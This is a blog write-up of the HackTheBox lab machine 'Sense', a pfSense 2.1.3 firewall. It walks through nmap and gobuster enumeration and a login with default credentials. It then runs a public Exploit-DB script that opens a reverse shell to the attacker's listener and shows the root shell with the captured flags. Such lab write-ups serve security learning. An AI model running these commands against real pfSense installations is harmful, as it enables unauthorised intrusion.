---
layout: post
title: "Sense Writeup - HackTheBox"
category: HackTheBox
---

# HTB lab Machine - Sense

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.154.28 folder that I have attached to this post.

## Enumeration summary

![image-20210530121147979.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210530121147979.png)

```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.129.154.28/

443/tcp open  ssl/http lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time

```

```
Summary   : Cookies[PHPSESSID,cookie_test], HttpOnly[PHPSESSID], JQuery, Script[text/javascript], PasswordField[passwordfld], X-Frame-Options[SAMEORIGIN], lighttpd[1.4.35], HTTPServer[lighttpd/1.4.35]
```

```
[-] [10.129.154.28 tcp/443/nmap-http] | http-enum:
[-] [10.129.154.28 tcp/443/nmap-http] |   /javascript/sorttable.js: Secunia NSI
[-] [10.129.154.28 tcp/443/nmap-http] |   /changelog.txt: Interesting, a changelog.
[-] [10.129.154.28 tcp/443/nmap-http] |_  /tree/: Potentially interesting folder

```

```
[-] [10.129.154.28 tcp/443/nmap-http] | http-sitemap-generator:
[-] [10.129.154.28 tcp/443/nmap-http] |   Directory structure:
[-] [10.129.154.28 tcp/443/nmap-http] |     /
[-] [10.129.154.28 tcp/443/nmap-http] |       Other: 1; php: 1
[-] [10.129.154.28 tcp/443/nmap-http] |     /csrf/
[-] [10.129.154.28 tcp/443/nmap-http] |       js: 1
[-] [10.129.154.28 tcp/443/nmap-http] |     /javascript/
[-] [10.129.154.28 tcp/443/nmap-http] |       js: 1
[-] [10.129.154.28 tcp/443/nmap-http] |     /themes/pfsense_ng/
[-] [10.129.154.28 tcp/443/nmap-http] |       css: 1
[-] [10.129.154.28 tcp/443/nmap-http] |     /themes/pfsense_ng/javascript/
[-] [10.129.154.28 tcp/443/nmap-http] |       js: 1
[-] [10.129.154.28 tcp/443/nmap-http] |   Longest directory structure:
[-] [10.129.154.28 tcp/443/nmap-http] |     Depth: 3
[-] [10.129.154.28 tcp/443/nmap-http] |     Dir: /themes/pfsense_ng/javascript/
[-] [10.129.154.28 tcp/443/nmap-http] |   Total files found (by extension):
[-] [10.129.154.28 tcp/443/nmap-http] |_    Other: 1; css: 1; js: 3; php: 1

```

```
+ Multiple index files found: /index.html, /index.php
```

![image-20210530122423857.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210530122423857.png)

![image-20210530122507274.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210530122507274.png)

```
[2Kwizard.php              [Status: 200, Size: 6691, Words: 907, Lines: 174]

[2Kxmlrpc.php              [Status: 200, Size: 384, Words: 78, Lines: 17]

[2Kxmlrpc.php              [Status: 200, Size: 384, Words: 78, Lines: 17]

[2Klicense.php             [Status: 200, Size: 6692, Words: 907, Lines: 174]

[2Kpkg.php                 [Status: 200, Size: 6688, Words: 907, Lines: 174]

[2Kstatus.php              [Status: 200, Size: 6691, Words: 907, Lines: 174]

[2Kstats.php               [Status: 200, Size: 6690, Words: 907, Lines: 174]

[2Ksystem.php              [Status: 200, Size: 6691, Words: 907, Lines: 174]

[2Kfavicon.ico             [Status: 200, Size: 1406, Words: 3, Lines: 7]

[2Kgraph.php               [Status: 200, Size: 6690, Words: 907, Lines: 174]

[2Khelp.php                [Status: 200, Size: 6689, Words: 907, Lines: 174]

[2Kedit.php                [Status: 200, Size: 6689, Words: 907, Lines: 174]

[2Kexec.php                [Status: 200, Size: 6689, Words: 907, Lines: 174]
```

```
Ă˘âĹĂ˘ââŹĂ˘ââŹ(kaliĂŁâ°Âżkali)-[~]
Ă˘ââĂ˘ââŹ$ gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://sense.htb -x php,txt,cnf,conf

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.60/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .php,.txt,.cnf,.conf
=====================================================
/index.php (Status: 200)
/help.php (Status: 200)
/themes (Status: 301)
/stats.php (Status: 200)
/css (Status: 301)
/edit.php (Status: 200)
/includes (Status: 301)
/license.php (Status: 200)
/system.php (Status: 200)
/status.php (Status: 200)
/javascript (Status: 301)
/changelog.txt (Status: 200)
/classes (Status: 301)
/exec.php (Status: 200)
/widgets (Status: 301)
/graph.php (Status: 200)
/tree (Status: 301)
/wizard.php (Status: 200)
/shortcuts (Status: 301)
/pkg.php (Status: 200)
/installer (Status: 301)
/wizards (Status: 301)
/xmlrpc.php (Status: 200)
/reboot.php (Status: 200)
/interfaces.php (Status: 200)
/csrf (Status: 200)
/system-users.txt (Status: 200)
```

## Exploitation

![image-20210530154859276.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210530154859276.png)

Okay then, this must be easy. Lets try some default passwords. rohit:pfsense worked:

![image-20210530154943323.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210530154943323.png)

The PFSense software provides the following infomation:

```
2.1.3-RELEASE (amd64)
built on Thu May 01 15:52:13 EDT 2014
FreeBSD 8.3-RELEASE-p16

Obtaining update status ...
```

Found this exploit: https://www.exploit-db.com/exploits/43560

Lets try it:

```
Ă˘âĹĂ˘ââŹĂ˘ââŹ(kaliĂŁâ°Âżkali)-[~/Desktop/DownloadedScripts]
Ă˘ââĂ˘ââŹ$ python3 exp.py --rhost 10.129.132.225 --lhost 10.10.14.31 --lport 4444 --username rohit --password pfsense
/home/kali/.local/lib/python3.9/site-packages/requests/packages/urllib3/connectionpool.py:847: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  warnings.warn((
CSRF token obtained
/home/kali/.local/lib/python3.9/site-packages/requests/packages/urllib3/connectionpool.py:847: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  warnings.warn((
/home/kali/.local/lib/python3.9/site-packages/requests/packages/urllib3/connectionpool.py:847: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  warnings.warn((
/home/kali/.local/lib/python3.9/site-packages/requests/packages/urllib3/connectionpool.py:847: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  warnings.warn((
Running exploit...
/home/kali/.local/lib/python3.9/site-packages/requests/packages/urllib3/connectionpool.py:847: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  warnings.warn((
Exploit completed

```

In your listener:

```
# cat user.txt
8721327cc232073b40d27d9c17e7348b
# cat /root/root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86
# whoami && id
root
uid=0(root) gid=0(wheel) groups=0(wheel)
#

```

Well. root and done.

## Final thoughts

A nice 10 pointer. Initial foothold was tricky since the txt file did not appear at first sight.
